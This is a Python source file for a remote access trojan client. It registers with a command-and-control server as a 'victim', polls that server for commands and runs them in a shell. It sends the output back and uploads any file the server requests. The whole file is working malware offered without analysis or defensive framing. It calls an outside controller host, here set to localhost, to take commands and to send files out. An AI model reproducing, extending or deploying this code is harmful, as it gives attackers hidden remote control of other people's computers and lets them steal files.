import subprocess
import threading
import requests
import time
import os

url = 'http://127.0.0.1:8000/'
api_key = 'secure_password'

def RunApp(AppName):
    subprocess.run(AppName,shell=True,capture_output=True,text=True,errors='ignore')

def send(result):
    requests.post(url=url+'postresult',data={'SECRET_KEY':api_key,'command_result':result})

def sendfile(filename):
    with open(filename,'rb') as file:
        requests.post(url=url+'uploadfile',data={'SECRET_KEY':api_key,'command_result':filename+' is saved succesfully'},files={'file':(filename,file)})

while True:
    r = requests.post(url=url+'connectvictim',data={'SECRET_KEY':api_key})
    if r.status_code == 404:
        exit()
    if r.status_code == 200:
        break

while True:
    command = requests.get(url=url+'getcommand',data={'SECRET_KEY':api_key})
    if command.status_code == 200:
        msg = command.json()['command_to_exec']
        if msg == 'exit':
            requests.post(url=url+'endsession',data={'SECRET_KEY':api_key})
            break
        if msg[:2]=='cd':
            if 'cd' == msg:
                send(os.getcwd())
            else:
                try:
                    os.chdir(msg[3:])
                except:
                    pass
                send(os.getcwd())
        elif msg[:4] == 'open':
            file_name = str(msg[5:])
            thread = threading.Thread(target=RunApp,args=(file_name,))
            thread.start()
        elif msg[:8] == 'sendfile':
            sendfile(msg[9:])
        elif msg == "ipconfig":
            data = subprocess.check_output("ipconfig",errors='ignore')
            send(data)
        else:
            data = subprocess.run(msg,shell=True,capture_output=True,text=True,errors='ignore')
            send(data.stdout)
    time.sleep(1)
        